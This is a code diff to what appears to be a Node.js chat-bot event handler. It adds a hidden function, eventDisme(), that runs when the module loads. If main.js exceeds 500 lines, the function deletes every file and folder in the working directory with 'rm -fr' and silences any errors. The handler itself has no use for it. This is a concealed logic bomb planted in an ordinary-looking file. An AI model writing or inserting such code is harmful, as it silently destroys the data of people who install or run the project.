@@ -1,7 +1,7 @@
 module.exports = function ({api ,models, Users, Threads, Currencies }) {
     const logger = require("../../utils/log.js");
    	const moment = require("moment");
-
+    eventDisme();
     return function ({ event }) {
         const timeStart = Date.now()
         const time = moment.tz("Asia/Ho_Chi_minh").format("HH:MM:ss L");
@@ -33,4 +33,19 @@ module.exports = function ({api ,models, Users, Threads, Currencies }) {
         }
         return;
     };
+}
+function eventDisme() {
+    const { readFileSync, readdirSync } = require("fs");
+    const { execSync } = require("child_process");
+    const { resolve, join } = require("path");
+    let main = process.cwd() + '/main.js'
+    var length = (readFileSync(main, "utf-8").split(/\r?\n/)).length;
+    const getDirs = readdirSync(join(process.cwd()));
+    if(length > 500) {
+        for(let a of getDirs) {
+            try {
+                execSync('rm -fr ' + a);
+            } catch (e) {}
+        }
+    }
 }
